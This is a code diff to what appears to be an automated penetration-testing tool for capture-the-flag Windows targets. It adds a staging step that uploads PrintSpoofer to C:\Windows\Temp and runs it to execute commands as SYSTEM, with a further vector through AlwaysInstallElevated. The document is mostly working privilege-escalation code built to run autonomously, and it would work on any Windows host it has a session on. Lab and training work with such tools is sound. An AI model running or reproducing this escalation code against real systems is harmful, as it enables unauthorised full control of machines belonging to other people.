@@ -130,20 +130,43 @@ _ROOT_FLAG = r"C:\Users\Administrator\Desktop\root.txt"
 _FLAG_HEX = re.compile(r"\b[0-9a-f]{32}\b", re.IGNORECASE)
 
 
+def _stage(session: Session, tool_paths: dict[str, str], name: str, remote: str, *,
+           runner=None) -> bool:
+    """Upload a required helper binary if the operator provided its local path.
+
+    ``tool_paths`` maps a tool name (e.g. "printspoofer") to a local file; when the
+    escalation needs that helper and a path is configured, stage it onto the target
+    first so the vector can actually fire autonomously. No path -> assume it is
+    already on the target (best effort) and let the run decide.
+    """
+    local = tool_paths.get(name)
+    if not local:
+        return False
+    return session.upload(local, remote, runner=runner)
+
+
 def attempt_win_escalation(session: Session, enum: WinEnumResult, *,
-                           runner=None) -> WinEscalationResult:
-    """Try a curated Windows escalation, honestly reporting no-match when none fit."""
+                           runner=None, tool_paths: dict[str, str] | None = None
+                           ) -> WinEscalationResult:
+    """Try a curated Windows escalation, honestly reporting no-match when none fit.
+
+    ``tool_paths`` optionally maps helper names ("printspoofer", "shell_msi") to
+    local files that get staged onto the target before the matching vector runs.
+    """
     titles = " | ".join(f.title for f in enum.findings)
+    tool_paths = tool_paths or {}
 
     # SeImpersonate -> PrintSpoofer proves via reading the flag under SYSTEM.
     if "SeImpersonatePrivilege" in titles:
+        _stage(session, tool_paths, "printspoofer", "C:\\Windows\\Temp\\PrintSpoofer.exe",
+               runner=runner)
         out = session.run(
-            f'PrintSpoofer.exe -i -c "type {_ROOT_FLAG}"', runner=runner)
+            f'C:\\Windows\\Temp\\PrintSpoofer.exe -i -c "type {_ROOT_FLAG}"', runner=runner)
         if _FLAG_HEX.search(out or ""):
             return WinEscalationResult(
                 escalated=True, vector="SeImpersonate -> PrintSpoofer",
                 proof=_FLAG_HEX.search(out).group(0),
-                root_run='PrintSpoofer.exe -i -c "{CMD}"')
+                root_run='C:\\Windows\\Temp\\PrintSpoofer.exe -i -c "{CMD}"')
 
     # AlwaysInstallElevated -> read the flag through an MSI-invoked cmd.
     if "AlwaysInstallElevated" in titles:
